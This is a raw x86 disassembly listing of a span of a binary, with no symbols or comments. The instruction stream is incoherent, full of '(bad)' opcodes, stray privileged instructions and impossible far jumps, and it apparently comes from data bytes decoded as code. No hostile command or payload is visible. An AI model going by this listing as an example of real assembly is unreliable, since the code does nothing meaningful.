  4220a4:	jg     0x422027
  4220a6:	jmp    FWORD PTR [ebx-0x69418801]
  4220ac:	push   0x63f24e57
  4220b1:	mov    edx,0x1d7cd
  4220b6:	bound  eax,QWORD PTR [eax]
  4220b8:	add    BYTE PTR [eax],al
  4220ba:	sbb    BYTE PTR ds:[edi],ah
  4220bd:	in     al,0xfc
  4220bf:	pop    ebx
  4220c0:	sub    DWORD PTR [eax-0x9263e7d],ebp
  4220c6:	pop    eax
  4220c7:	cli    
  4220c8:	adc    ecx,DWORD PTR [ecx]
  4220ca:	sub    ch,dh
  4220cc:	icebp  
  4220cd:	xchg   ebp,eax
  4220ce:	(bad)  
  4220cf:	pop    ebp
  4220d0:	jg     0x422059
  4220d2:	arpl   WORD PTR [edx-0x481e1484],dx
  4220d8:	dec    edx
  4220d9:	cmp    DWORD PTR [eax-0x49],edx
  4220dc:	test   eax,0x5240d11c
  4220e1:	ins    BYTE PTR es:[edi],dx
  4220e2:	push   eax
  4220e3:	dec    esp
  4220e4:	add    dh,dl
  4220e6:	dec    edi
  4220e7:	popf   
  4220e8:	xlat   BYTE PTR ds:[ebx]
  4220e9:	and    eax,0xf8bd502
  4220ee:	cmp    DWORD PTR [ecx+0x22],edi
  4220f1:	fimul  DWORD PTR [ecx+0x22]
  4220f4:	mov    ah,0x64
  4220f6:	(bad)  
  4220f8:	xchg   DWORD PTR [edx-0x3b4c2520],edx
  4220fe:	sti    
  4220ff:	rcl    DWORD PTR [edi+0x6d],0xed
  422103:	hlt    
  422104:	push   ecx
  422105:	test   BYTE PTR [edi+ecx*4-0xa],0xe4
  42210a:	inc    edx
  42210b:	xchg   ebx,eax
  42210c:	shr    DWORD PTR [ecx+ecx*2-0x14fc867a],cl
  422113:	xor    bl,dh
  422115:	inc    edi
  422116:	mov    eax,ds:0x5a250582
  42211b:	pop    es
  42211c:	add    BYTE PTR [eax],al
  42211e:	add    BYTE PTR [eax],al
  422120:	add    BYTE PTR [eax],al
  422122:	cmp    dh,dl
  422124:	cmp    ah,BYTE PTR [esi+edi*8]
  422127:	in     al,dx
  422128:	fimul  WORD PTR ds:[edi-0x4b53942b]
  42212f:	dec    esp
  422130:	or     al,bl
  422132:	das    
  422133:	fadd   DWORD PTR [ecx]
  422135:	add    BYTE PTR [edx+0x0],ah
  422138:	add    BYTE PTR [eax],al
  42213a:	lds    eax,FWORD PTR [ebp-0x9]
  42213d:	aas    
  42213e:	inc    edx
  42213f:	cmp    DWORD PTR [esi-0x4f901c04],ebx
  422145:	and    ecx,0xfe611387
  42214b:	add    edx,DWORD PTR [eax]
  42214d:	dec    ebx
  42214e:	or     DWORD PTR [edi+eax*4],ecx
  422151:	lds    esi,FWORD PTR [edx]
  422153:	mov    dl,0x55
  422155:	sub    al,0x87
  422157:	stos   BYTE PTR es:[edi],al
  422158:	cwde   
  422159:	mov    edi,0x47091425
  42215e:	popf   
  42215f:	pushf  
  422160:	push   0x16
  422162:	or     BYTE PTR [edx+0x26],bl
  422165:	jl     0x4221c7
  422167:	dec    ebp
  422168:	in     eax,0x33
  42216a:	push   0xffffff99
  42216c:	and    edx,DWORD PTR [ebx-0x278cc1af]
  422172:	cld    
  422173:	mov    DWORD PTR [ecx+0x3f1893af],esp
  422179:	xchg   edx,eax
  42217a:	dec    ebx
  42217b:	nop
  42217c:	outs   dx,DWORD PTR ds:[esi]
  42217d:	mov    ch,0xab
  42217f:	lea    esp,[ebp-0x3d]
  422182:	jl     0x422117
  422184:	push   es
  422185:	jmp    0xa10d3da2
  42218a:	or     BYTE PTR [ebx-0x66c0b0d7],0xa1
  422191:	xchg   edx,eax
  422192:	mov    bh,0xe
  422194:	add    ebx,DWORD PTR [esi+0x24732c52]
  42219a:	jno    0x4221a2
  42219c:	add    BYTE PTR [eax],al
  42219e:	add    BYTE PTR [eax],al
  4221a0:	add    BYTE PTR [eax],al
  4221a2:	fnstenv [esi-0x2490e49a]
  4221a8:	std    
  4221a9:	neg    BYTE PTR [esi]
  4221ab:	sub    esp,DWORD PTR [ebx-0x23]
  4221ae:	jae    0x422151
  4221b0:	test   BYTE PTR [edx+0x1d891],bl
  4221b6:	bound  eax,QWORD PTR [eax]
  4221b8:	add    BYTE PTR [eax],al
  4221ba:	scas   al,BYTE PTR es:[edi]
  4221bb:	into   
  4221bc:	(bad)  
  4221bd:	loopne 0x422144
  4221bf:	sbb    ah,BYTE PTR [ebp+0x7cddb7c4]
  4221c5:	retf   0x9d2b
  4221c8:	pop    esp
  4221c9:	xchg   ebx,eax
  4221ca:	jmp    0x5ba8:0xd8232433
  4221d1:	fst    QWORD PTR [ecx+0x11a01dc]
  4221d7:	and    BYTE PTR [eax-0x561ebe21],bl
  4221dd:	jmp    0x4221d6
  4221df:	xor    dh,BYTE PTR [edi-0x752e55ff]
  4221e5:	and    al,0xa1
  4221e7:	cmp    eax,0xc47e5cf3
  4221ec:	sbb    eax,0xd3be6469
  4221f1:	lods   eax,DWORD PTR ds:[esi]
  4221f2:	cli    
  4221f3:	mov    al,ds:0x89068f59
  4221f8:	test   al,0x11
  4221fa:	cmp    al,0x60
  4221fc:	aas    
  4221fd:	rcl    bl,1
  4221ff:	pop    esi
  422200:	dec    edx
  422201:	and    eax,0x7fdee0d0
  422206:	aaa    
  422207:	xor    ebp,DWORD PTR [edi+0x32]
  42220a:	in     al,0x4e
  42220c:	mov    cl,0xdc
  42220e:	sbb    BYTE PTR [edi],0xef
  422211:	jp     0x42222e
  422213:	dec    BYTE PTR [eax+ebp*1]
  422216:	call   0x850ce4ff
  42221b:	loopne 0x42221d
  42221d:	add    BYTE PTR [eax],al
  42221f:	add    BYTE PTR [eax],al
  422221:	add    dl,bl
  422223:	xor    dl,BYTE PTR [edi-0x20500076]
  422229:	jb     0x42222e
  42222b:	inc    ebp
  42222c:	mov    ds:0xf852625c,eax
  422231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422232:	repz fadd DWORD PTR [ecx]
  422235:	add    BYTE PTR [edx+0x0],ah
  422238:	add    BYTE PTR [eax],al
  42223a:	shr    DWORD PTR [ebp+0x4a],1
  42223d:	dec    edi
  42223e:	xor    eax,0x6481fad1
  422243:	inc    esi
  422244:	cwde   
  422245:	cs sar al,1
  422248:	int3   
  422249:	sahf   
  42224a:	mov    bh,0x5d
  42224c:	mov    bh,0xab
  42224e:	mov    eax,0xe3a5564
  422253:	push   ebp
  422254:	dec    edx
  422255:	xchg   BYTE PTR [ecx-0x17],bl
  422258:	adc    dl,BYTE PTR [ecx]
  42225a:	push   eax
  42225b:	mov    esi,edx
  42225d:	jmp    0x69d1:0xf5637323
  422264:	jo     0x4222a0
  422266:	sbb    DWORD PTR ds:0x3d5155ff,edx
  42226c:	cld    
  42226d:	in     eax,0x46
  42226f:	inc    edi
  422270:	loope  0x4222d3
  422272:	inc    ebx
  422273:	or     edi,DWORD PTR [ebp-0x51]
  422276:	push   edx
  422277:	adc    ecx,edi
  422279:	pop    edx
  42227a:	dec    ecx
  42227b:	and    eax,0xa6685c75
  422280:	dec    ebp
  422281:	mov    al,ds:0x66a46eb8
  422286:	test   eax,0x374d20df
  42228b:	adc    ecx,DWORD PTR ds:0x9ead5893
  422291:	mov    al,ds:0xacfbdf37
  422296:	mov    DWORD PTR [ebx-0x3e5296c1],edi
  42229c:	add    BYTE PTR [eax],al
  42229e:	add    BYTE PTR [eax],al
  4222a0:	add    BYTE PTR [eax],al
  4222a2:	dec    eax
  4222a3:	in     al,0x3
  4222a5:	fwait
  4222a6:	scas   eax,DWORD PTR es:[edi]
  4222a7:	(bad)  
  4222a8:	fdiv   st,st(7)
  4222aa:	pop    esi
  4222ab:	sub    BYTE PTR [eax+0x26246a8f],bl
  4222b1:	adc    DWORD PTR [ebp-0x27],0x1
  4222b5:	add    BYTE PTR [edx+0x0],ah
  4222b8:	add    BYTE PTR [eax],al
  4222ba:	in     al,dx
  4222bb:	add    bh,BYTE PTR [ecx-0x35]
  4222be:	mov    al,ds:0x96ed0606
  4222c3:	dec    ebp
  4222c4:	adc    DWORD PTR [ecx-0x342ad8cb],eax
  4222ca:	mov    ebx,0xac740f73
  4222cf:	shl    DWORD PTR [eax+eax*1+0x5c],0xc
  4222d4:	add    ah,BYTE PTR [ebx]
  4222d6:	in     al,dx
  4222d7:	arpl   WORD PTR [ebp+0x6bd53c34],bp
  4222dd:	inc    BYTE PTR ds:[ecx-0x4]
  4222e1:	and    DWORD PTR ds:0x50976286,0x17
  4222e8:	cld    
  4222e9:	(bad)  
  4222ea:	mov    esp,0xcab1f54b
  4222ef:	xor    DWORD PTR [ebx],0x17441377
  4222f5:	add    DWORD PTR [edi+0x4b8e1b79],edi
  4222fb:	pop    eax
  4222fc:	jbe    0x42230a
  4222fe:	jmp    0xfe3b:0xc7071579
  422305:	mov    al,0x66
  422307:	pop    edi
  422308:	pop    ebp
  422309:	fsubr  QWORD PTR [eax-0x5bf16f03]
  42230f:	mov    edi,0x55756f8
  422314:	pop    ds
  422315:	ins    BYTE PTR es:[edi],dx
  422316:	add    DWORD PTR ds:0xfaa8584b,edx
  42231c:	add    BYTE PTR [eax],al
  42231e:	add    BYTE PTR [eax],al
  422320:	add    BYTE PTR [eax],al
  422322:	push   edx
  422323:	add    al,0xa2
  422325:	xor    dh,0xa6
  422328:	jb     0x4222fe
  42232a:	ins    DWORD PTR es:[edi],dx
  42232b:	xor    dh,BYTE PTR [edx]
  42232d:	and    eax,0x5290fd7c
  422332:	mov    bh,0xd9
  422334:	add    DWORD PTR [eax],eax
  422336:	bound  eax,QWORD PTR [eax]
  422338:	add    BYTE PTR [eax],al
  42233a:	and    ecx,DWORD PTR [edx+0x62abf34f]
  422340:	jnp    0x4222e3
  422342:	pop    ebp
  422343:	ins    BYTE PTR es:[edi],dx
  422344:	shl    bh,0x8a
  422347:	out    0x4d,al
  422349:	xchg   edi,eax
  42234a:	mov    ebx,ds
  42234c:	test   eax,0xdb495107
  422351:	sbb    al,0x4c
  422353:	mov    dh,bl
  422355:	lahf   
  422356:	daa    
  422357:	mov    ch,0xe
  422359:	stc    
  42235a:	rol    DWORD PTR [esi],cl
  42235c:	jne    0x4223d1
  42235e:	ja     0x4222e7
  422360:	push   esi
  422361:	icebp  
  422362:	dec    esi
  422363:	push   esp
  422364:	dec    esp
  422365:	enter  0x9664,0x83
  422369:	retf   
  42236a:	and    al,0x4e
  42236c:	sbb    eax,0xcb2acd83
  422371:	cmp    eax,DWORD PTR [edx+0x51e79e0f]
  422377:	mov    bl,0x64
  422379:	adc    DWORD PTR [edx+0x68],esi
  42237c:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  42237e:	mul    BYTE PTR ds:0x8ad4fdf5
  422384:	ja     0x422357
  422386:	xchg   esp,eax
  422387:	dec    edx
  422388:	cmp    al,cl
  42238a:	in     al,0xd3
  42238c:	xchg   edi,eax
  42238d:	scas   eax,DWORD PTR es:[edi]
  42238e:	pop    es
  42238f:	ss loop 0x4223b7
  422392:	mov    esp,eax
  422394:	mov    ds:0x8664c1cb,eax
  422399:	or     BYTE PTR [edx],bl
  42239b:	jle    0x42239d
  42239d:	add    BYTE PTR [eax],al
  42239f:	add    BYTE PTR [eax],al
  4223a1:	add    BYTE PTR [eax],bh
  4223a3:	push   0xffffff96
  4223a5:	add    edx,esi
  4223a7:	(bad)  
  4223a8:	mov    ebp,0xdb4ef67b
  4223ad:	out    0xf8,eax
  4223af:	or     al,0x25
  4223b1:	xor    bl,BYTE PTR [ecx]
  4223b3:	fiadd  DWORD PTR [ecx]
  4223b5:	add    BYTE PTR [edx+0x0],ah
  4223b8:	add    BYTE PTR [eax],al
  4223ba:	inc    eax
  4223bb:	or     DWORD PTR [eax+0x42208458],0xffffffa2
  4223c2:	inc    eax
  4223c3:	xchg   esi,eax
  4223c4:	bnd es jno 0x42238f
  4223c8:	jg     0x4223e5
  4223ca:	mov    ebx,0xfceb05f6
  4223cf:	test   BYTE PTR [esi],bl
  4223d1:	xor    DWORD PTR [edi],eax
  4223d3:	stc    
  4223d4:	sbb    BYTE PTR [ecx+0x6cc19c3b],ch
  4223da:	add    al,0xca
  4223dc:	nop
  4223dd:	inc    edi
  4223de:	outs   dx,DWORD PTR ds:[esi]
  4223df:	in     al,dx
  4223e0:	popf   
  4223e1:	out    dx,eax
  4223e2:	shr    BYTE PTR [ecx],1
  4223e4:	fs or  al,0x91
  4223e7:	jmp    0xb5693c38
  4223ec:	sbb    cl,al
  4223ee:	nop
  4223ef:	sub    al,0xe
  4223f1:	mov    bh,0x8f
  4223f3:	iret   
  4223f4:	inc    eax
  4223f5:	push   ds
  4223f6:	fmul   QWORD PTR [edi+0x41]
  4223f9:	fcom   QWORD PTR [edi+edx*8]
  4223fc:	xor    ch,BYTE PTR [edi+0x67]
  4223ff:	hlt    
  422400:	sbb    eax,0xfc682e94
  422405:	shr    DWORD PTR [edi],cl
  422407:	sub    ebp,edx
  422409:	fdivr  QWORD PTR [eax]
  42240b:	mov    al,0xbe
  42240d:	loope  0x422448
  42240f:	jns    0x422486
  422411:	cmp    edi,DWORD PTR [ecx+0x32c0d30b]
  422417:	pushf  
  422418:	retf   
  422419:	or     BYTE PTR [edi-0x58],bh
  42241c:	add    BYTE PTR [eax],al
  42241e:	add    BYTE PTR [eax],al
  422420:	add    BYTE PTR [eax],al
  422422:	jmp    0x7a729ee0
  422427:	repz jmp 0x422423
  42242a:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42242e:	out    dx,al
  42242f:	aaa    
  422430:	int3   
  422431:	cwde   
  422432:	jnp    0x42240e
  422434:	add    DWORD PTR [eax],eax
  422436:	bound  eax,QWORD PTR [eax]
  422438:	add    BYTE PTR [eax],al
  42243a:	(bad)  
  42243b:	sti    
  42243c:	push   ecx
  42243d:	in     al,dx
  42243e:	call   0xec2c8a57
  422443:	mov    bl,0xfe
  422445:	inc    ebx
  422446:	add    ebp,0xffffffa8
  422449:	cwde   
  42244a:	test   BYTE PTR [eax],cl
  42244c:	mov    bx,0xc902
  422450:	xor    eax,0x12326b
  422455:	inc    edi
  422456:	scas   eax,DWORD PTR es:[edi]
  422457:	sbb    BYTE PTR [ebx-0x334cc506],0x71
  42245e:	fsub   QWORD PTR [ebx+ebx*8]
  422461:	inc    ebx
  422462:	ret    
  422463:	pop    ecx
  422464:	je     0x4224b2
  422466:	(bad)  
  422467:	imul   esp,DWORD PTR [edx-0x3c],0xffffffc1
  42246b:	mov    ecx,0x5369771
  422470:	inc    esp
  422471:	hlt    
  422472:	or     dh,BYTE PTR [ebp+0x74444fb6]
  422478:	or     ah,BYTE PTR [ecx+ebp*1]
  42247b:	test   DWORD PTR [edi],ecx
  42247d:	jo     0x4224a8
  42247f:	mov    esi,0xc99878ce
  422484:	xor    bl,BYTE PTR ds:[edx+0x16c901b8]
  42248b:	sar    BYTE PTR [esi],1
  42248d:	pop    edi
  42248e:	mov    dh,BYTE PTR [eax]
  422490:	xor    al,0x4b
  422492:	das    
  422493:	xchg   ebp,eax
  422494:	mov    ch,0x2
  422496:	es add eax,0x5f2e3481
  42249c:	add    BYTE PTR [eax],al
  42249e:	add    BYTE PTR [eax],al
  4224a0:	add    BYTE PTR [eax],al
  4224a2:	pop    ebx
  4224a3:	inc    ecx
  4224a4:	pop    ebx
  4224a5:	iret   
  4224a6:	pop    ebx
  4224a7:	(bad)  
  4224a9:	aad    0xf
  4224ab:	ss dec esp
  4224ad:	dec    esi
  4224ae:	shl    DWORD PTR [edx],1
  4224b0:	das    
  4224b1:	mov    ds:0x1dadd,eax
  4224b6:	bound  eax,QWORD PTR [eax]
  4224b8:	add    BYTE PTR [eax],al
  4224ba:	inc    ebp
  4224bb:	aaa    
  4224bc:	mov    eax,ds:0x1de7c8c
  4224c1:	mov    ebp,DWORD PTR [eax-0x2b3fdfed]
  4224c7:	test   DWORD PTR [ecx-0x3f],ebx
  4224ca:	inc    eax
  4224cb:	(bad)  
  4224cc:	mov    edx,ds
  4224ce:	xor    DWORD PTR [eax+0x1076d33f],esi
  4224d4:	adc    eax,0xd108a848
  4224d9:	pop    ebx
  4224da:	push   edx
  4224db:	xlat   BYTE PTR ds:[ebx]
  4224dc:	pop    ebx
  4224dd:	test   al,0x38
  4224df:	adc    BYTE PTR [ebp-0x76f015db],bh
  4224e5:	push   ecx
  4224e6:	sbb    bl,0xc5
  4224e9:	into   
  4224ea:	xor    al,0x3c
  4224ec:	jg     0x4224f8
  4224ee:	ja     0x422479
  4224f0:	fst    DWORD PTR [eax+0x29]
  4224f3:	aaa    
  4224f4:	iret   
  4224f5:	sbb    BYTE PTR [esi+esi*4+0x154bfb5f],0x11
  4224fd:	jge    0x4224c4
  4224ff:	les    ebx,FWORD PTR [edi+0x57]
  422502:	jns    0x4224f5
  422504:	lea    eax,[eax-0x1a]
  422507:	xor    ebp,DWORD PTR [esi-0x7a]
  42250a:	inc    ebp
  42250b:	in     eax,dx
  42250c:	mov    esi,0xc483abb0
  422511:	sbb    BYTE PTR [esi],bl
  422513:	(bad)  
  422514:	dec    ebp
  422515:	int    0xca
  422517:	cmp    al,0x58
  422519:	test   al,0x5e
  42251b:	mov    BYTE PTR [eax],0x0
  42251e:	add    BYTE PTR [eax],al
  422520:	add    BYTE PTR [eax],al
  422522:	fwait
  422523:	test   DWORD PTR [ebp+0x3c],esp
  422526:	jg     0x422524
  422528:	(bad)  [edi-0x65be08a1]
  42252e:	inc    ecx
  42252f:	dec    edi
  422530:	sub    DWORD PTR [edi+edi*1-0x25],ebp
  422534:	add    DWORD PTR [eax],eax
  422536:	bound  eax,QWORD PTR [eax]
  422538:	add    BYTE PTR [eax],al
  42253a:	out    0x95,al
  42253c:	and    dh,ch
  42253e:	(bad)  
  42253f:	cli    
  422540:	cmp    bl,ch
  422542:	xchg   esi,eax
  422543:	pop    esi
  422544:	push   ds
  422545:	ds data16 mov al,0x65
  422549:	cmp    eax,0xc018ba8
  42254e:	pop    edi
  42254f:	xor    BYTE PTR [ecx-0x77],bh
  422552:	dec    ecx
  422553:	addr16 xor al,0xe1
  422556:	dec    edi
  422557:	jge    0x42251c
  422559:	into   
  42255a:	(bad)  
  42255b:	xlat   BYTE PTR ds:[ebx]
  42255c:	(bad)  
  42255d:	jl     0x4225a7
  42255f:	and    BYTE PTR [ecx+0x35],ch
  422562:	cld    
  422563:	enter  0xe908,0x5
  422567:	stos   BYTE PTR es:[edi],al
  422568:	mov    eax,ds:0xbab4f076
  42256d:	cld    
  42256e:	int3   
  42256f:	jl     0x422501
  422571:	inc    edx
  422572:	mov    BYTE PTR [ecx+0x5e1fddc4],ch
  422578:	outs   dx,BYTE PTR ds:[esi]
  422579:	mov    ch,0x71
  42257b:	or     cl,bl
  42257d:	aaa    
  42257e:	stos   DWORD PTR es:[edi],eax
  42257f:	iret   
  422580:	dec    ebp
  422581:	or     DWORD PTR [eax-0x5b],edi
  422584:	mov    esi,0x5b3c5be5
  422589:	mov    ebx,0x351b9192
  42258e:	cwde   
  42258f:	and    dl,BYTE PTR [ebp+0x32]
  422592:	pushf  
  422593:	sbb    BYTE PTR [ebp-0x6a],bl
  422596:	cdq    
  422597:	push   es
  422598:	push   edi
  422599:	outs   dx,DWORD PTR ds:[esi]
  42259a:	jns    0x422571
  42259c:	add    BYTE PTR [eax],al
  42259e:	add    BYTE PTR [eax],al
  4225a0:	add    BYTE PTR [eax],al
  4225a2:	outs   dx,BYTE PTR ds:[esi]
  4225a3:	jae    0x422595
  4225a5:	retf   0xcbfd
  4225a8:	jle    0x4225a1
  4225aa:	repz xor eax,0x4df88ce9
  4225b0:	daa    
  4225b1:	test   eax,0x1dba1
  4225b6:	bound  eax,QWORD PTR [eax]
  4225b8:	add    BYTE PTR [eax],al
  4225ba:	mov    bl,0xcc
  4225bc:	call   0x436f5ecd
  4225c1:	jnp    0x422635
  4225c3:	leave  
  4225c4:	int    0xee
  4225c6:	sbb    DWORD PTR [esi+edx*8-0x6346f6c6],0x35
  4225ce:	xlat   BYTE PTR ds:[ebx]
  4225cf:	cmc    
  4225d0:	bound  ecx,QWORD PTR [eax+eiz*4+0x72]
  4225d4:	xor    al,0xdc
  4225d6:	inc    esi
  4225d7:	in     eax,dx
  4225d8:	retf   0xe6ec
  4225db:	add    DWORD PTR [eax+edx*8],esp
  4225de:	arpl   WORD PTR [edx+0x7e],sp
  4225e1:	inc    ecx
  4225e2:	aam    0xe5
  4225e4:	dec    esp
  4225e5:	inc    esp
  4225e6:	retf   
  4225e7:	test   DWORD PTR [eax+ebx*1-0x379d35f0],esi
  4225ee:	cmp    al,0xd9
  4225f0:	cmp    edx,esi
  4225f2:	push   0xffffffd6
  4225f4:	sahf   
  4225f5:	cmp    dh,BYTE PTR [eax-0x63]
  4225f8:	add    DWORD PTR ds:0x57b0a56,esi
  4225fe:	cmp    al,0x90
  422600:	fst    DWORD PTR [ebp-0x426fb8f6]
  422606:	pop    esi
  422607:	push   es
  422608:	inc    ecx
  422609:	sti    
  42260a:	or     bl,BYTE PTR [ecx+0x3e234d74]
  422610:	adc    al,0x53
  422612:	cld    
  422613:	outs   dx,DWORD PTR ds:[esi]
  422614:	retf   0xeff5
  422617:	jmp    0x0:0x57dbbe4f
  42261e:	add    BYTE PTR [eax],al
  422620:	add    BYTE PTR [eax],al
  422622:	cmc    
  422623:	adc    al,0xae
  422625:	adc    ebp,edi
  422627:	mov    ebx,0x84e6f6fd
  42262c:	lds    ebp,FWORD PTR [edx-0xb5ef140]
  422632:	add    ebx,esp
  422634:	add    DWORD PTR [eax],eax
  422636:	bound  eax,QWORD PTR [eax]
  422638:	add    BYTE PTR [eax],al
  42263a:	cmp    DWORD PTR [ebx+0x73edb718],edi
  422640:	xchg   ecx,eax
  422641:	dec    esi
  422642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422643:	jno    0x4225cd
  422645:	jne    0x42264b
  422647:	scas   eax,DWORD PTR es:[edi]
  422648:	mov    ah,0x6d
  42264a:	ror    BYTE PTR [esi-0x17],0xe3
  42264e:	jmp    0x162b22cf
  422653:	in     eax,0x37
  422655:	jle    0x42266d
  422657:	mov    edx,0x5e60c6d6
  42265c:	or     al,0x72
  42265e:	adc    BYTE PTR [esi],dl
  422660:	jl     0x4226b5
  422662:	push   0xffffff9a
  422664:	jmp    0xd7143c7a
  422669:	cwde   
  42266a:	ins    DWORD PTR es:[edi],dx
  42266b:	xor    ecx,DWORD PTR [edi+edi*1+0x674467c0]
  422672:	adc    ch,BYTE PTR [esi+0x43]
  422675:	fsubr  QWORD PTR [ebx+ecx*2-0x54]
  422679:	popa   
  42267a:	cmp    edx,0xb9a4cb17
  422680:	bound  ecx,QWORD PTR [eax-0x5d]
  422683:	adc    DWORD PTR [ebp-0x3a],eax
  422686:	(bad)  
  422687:	(bad)  
  422688:	sbb    DWORD PTR [edx+0x6b74763d],esp
  42268e:	cwde   
  42268f:	je     0x422702
  422691:	mov    DWORD PTR [edx],eax
  422693:	add    DWORD PTR [edx+0x58b98ed2],edx
  422699:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42269a:	sub    al,0x20
  42269c:	add    BYTE PTR [eax],al
  42269e:	add    BYTE PTR [eax],al
  4226a0:	add    BYTE PTR [eax],al
  4226a2:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4226a8:	mov    edi,0xbb1c16fb
  4226ad:	rcr    BYTE PTR [ebx+0x6521c068],0xdc
  4226b4:	add    DWORD PTR [eax],eax
  4226b6:	bound  eax,QWORD PTR [eax]
  4226b8:	add    BYTE PTR [eax],al
  4226ba:	call   0xb893:0x6e4a96b9
  4226c1:	dec    esi
  4226c2:	sahf   
  4226c3:	xor    BYTE PTR [ebp-0x26ed2162],dl
  4226c9:	mov    ebp,0x654f3255
  4226ce:	jle    0x4226c1
  4226d0:	jb     0x4226c9
  4226d2:	imul   ecx,DWORD PTR [esi],0x19f1fbb4
  4226d8:	mov    WORD PTR [eax+0x1d],?
  4226db:	and    al,0xdb
  4226dd:	push   ecx
  4226de:	inc    edi
  4226df:	in     eax,0xf2
  4226e1:	fnstsw WORD PTR [edi-0x49]
  4226e4:	ds jmp 0x422669
  4226e7:	xlat   BYTE PTR ds:[ebx]
  4226e8:	sbb    edx,0x4295b227
  4226ee:	shr    DWORD PTR [esi],cl
  4226f0:	inc    ebx
  4226f1:	nop
  4226f2:	push   esi
  4226f3:	push   esp
  4226f4:	adc    DWORD PTR [ebx],0x34
  4226f7:	or     al,0x2c
  4226f9:	ja     0x42271c
  4226fb:	stos   BYTE PTR es:[edi],al
  4226fc:	mov    esi,0x3d8af09
  422701:	jae    0x4226b9
  422703:	jg     0x422720
  422705:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422706:	aam    0x51
  422708:	pop    ebx
  422709:	push   ebx
  42270a:	ror    BYTE PTR [ebx+edx*1-0x35119033],0x7
  422712:	scas   eax,DWORD PTR es:[edi]
  422713:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422714:	leave  
  422715:	pushf  
  422716:	mov    ebp,0xa5fa4e97
  42271b:	add    BYTE PTR [eax],al
  42271d:	add    BYTE PTR [eax],al
  42271f:	add    BYTE PTR [eax],al
  422721:	add    ah,dl
  422723:	sqrtps xmm6,xmm0
  422726:	(bad)  
  422728:	cmc    
  422729:	das    
  42272a:	sbb    BYTE PTR [eax],cl
  42272c:	xchg   ebx,eax
  42272d:	iret   
  42272e:	or     al,0xba
  422730:	pop    ecx
  422731:	out    0xc7,al
  422733:	fadd   QWORD PTR [ecx]
  422735:	add    BYTE PTR [edx+0x0],ah
  422738:	add    BYTE PTR [eax],al
  42273a:	jnp    0x422702
  42273c:	jae    0x42276b
  42273e:	sbb    al,0x4f
  422740:	mov    eax,ds:0x69ceca52
  422745:	push   0xc17fcd85
  42274a:	adc    cl,al
  42274c:	jne    0x4227ac
  42274e:	mov    ebp,0x3b00ed25
  422753:	ins    BYTE PTR es:[edi],dx
  422754:	cmp    ah,dh
  422756:	ss inc edi
  422758:	pop    ebp
  422759:	sub    ah,BYTE PTR [esi]
  42275b:	mov    dh,bh
  42275d:	push   ecx
  42275e:	sub    esi,edx
  422760:	sbb    DWORD PTR [ebp+0x8d35fd0],edx
  422766:	pop    edi
  422767:	aad    0x0
  422769:	inc    ecx
  42276a:	div    DWORD PTR [ebp+edi*2-0x7696d5ef]
  422771:	addr16 ret 
  422773:	hlt    
  422774:	sub    ecx,DWORD PTR [eax]
  422776:	pop    ds
  422777:	mov    eax,ds:0x23331e37
  42277c:	mov    DWORD PTR [edi+0x2f6d7309],esi
  422782:	push   ds
  422783:	cmp    dl,BYTE PTR [edx+0x3e]
  422786:	xchg   esi,eax
  422787:	rcr    BYTE PTR es:[edi+0x3ec44945],1
  42278e:	into   
  42278f:	mov    al,cl
  422791:	mov    cl,0x31
  422793:	fwait
  422794:	mov    al,0xba
  422796:	arpl   ax,sp
  422798:	or     eax,0xbfa258
  42279d:	add    BYTE PTR [eax],al
  42279f:	add    BYTE PTR [eax],al
  4227a1:	add    ch,cl
  4227a3:	sub    eax,0xfbf54395
  4227a8:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4227ae:	(bad)  
  4227b0:	lds    esi,FWORD PTR [edx]
  4227b2:	sub    ebp,ebx
  4227b4:	add    DWORD PTR [eax],eax
  4227b6:	bound  eax,QWORD PTR [eax]
  4227b8:	add    BYTE PTR [eax],al
  4227ba:	and    edx,DWORD PTR [ecx]
  4227bc:	mov    ds:0xbd5aa964,eax
  4227c1:	add    eax,0x3f30880e
  4227c6:	xor    al,0x48
  4227c8:	je     0x4227fd
  4227ca:	call   0x2ffd:0x191a400a
  4227d1:	mov    dh,0xd9
  4227d3:	push   ebp
  4227d4:	out    dx,eax
  4227d5:	cmp    edi,DWORD PTR [bx+si]
  4227d8:	int3   
  4227d9:	or     al,0xfd
  4227db:	ret    
  4227dc:	jno    0x422785
  4227de:	or     bh,BYTE PTR [ecx-0x5e]
  4227e1:	test   al,0x79
  4227e3:	mov    ah,0xe9
  4227e5:	mov    ds:0x31a627c3,eax
  4227ea:	mov    ah,0xae
  4227ec:	xchg   ebp,eax
  4227ed:	loop   0x422866
  4227ef:	sbb    al,BYTE PTR [ecx]
  4227f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227f2:	cmp    BYTE PTR [eax],0xc0
  4227f5:	jnp    0x4227ec
  4227f7:	int    0x3b
  4227f9:	add    eax,0xc34e5eb9
  4227fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227ff:	out    0x29,eax
  422801:	dec    BYTE PTR [ebx+0xf3762c3]
  422807:	xchg   edi,eax
  422808:	sub    DWORD PTR [ecx],esi
  42280a:	fisub  WORD PTR ds:0xa79eaac6
  422810:	and    eax,0xf996c519
  422815:	js     0x4227ce
  422817:	sar    DWORD PTR [ecx+0x13],0xab
  42281b:	mov    al,0x0
  42281d:	add    BYTE PTR [eax],al
  42281f:	add    BYTE PTR [eax],al
  422821:	add    BYTE PTR [ebx],dl
  422823:	fs out 0xb,eax
  422826:	test   DWORD PTR [ebx-0xce58301],0xa6c44cfc
  422830:	aas    
  422831:	xor    DWORD PTR [ebx+0x620001dd],ecx
  422837:	add    BYTE PTR [eax],al
  422839:	add    BYTE PTR [esi-0x3],ch
  42283c:	in     al,0x5f
  42283e:	lahf   
  42283f:	push   edx
  422840:	clc    
  422841:	ret    
  422842:	imul   esp,DWORD PTR [ecx-0x21e91e5f],0xa
  422849:	or     edx,DWORD PTR [edi+0x32]
  42284c:	lock mov dl,0xcd
  42284f:	pop    eax
  422850:	lock mov ah,al
  422853:	shl    DWORD PTR [ebp+0x8a6d7b6],cl
  422859:	scas   eax,DWORD PTR es:[edi]
  42285a:	int    0x67
